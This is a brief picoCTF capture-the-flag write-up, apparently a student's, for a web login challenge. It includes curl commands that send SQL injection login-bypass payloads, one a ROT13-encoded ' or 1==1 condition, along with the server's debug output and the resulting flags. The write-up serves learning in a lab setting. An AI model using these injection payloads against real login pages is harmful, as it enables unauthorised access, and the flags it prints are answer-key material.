## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Pistas
Seems like the password is encrypted.
## Solucion
```
picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
## otra solucion
```
                                                                                             ┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin&password=password&debug=1"
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=password&debug=1"
<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/54253/login.php -d "password=' be 1==1;&debug=1"
<pre>password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p> 
```
## Notas adicionales 
primero que nada pusimos el debug en 1, despues pusimos el comando ' or 1= =1; y nos dio como resultado el ' be 1= =1; esto quiere decir que esta encriptado y pusimos esto en la contraseña para que hiciera referente a lo primero que pusimos y asi conseguimos la bandera
## Referencias 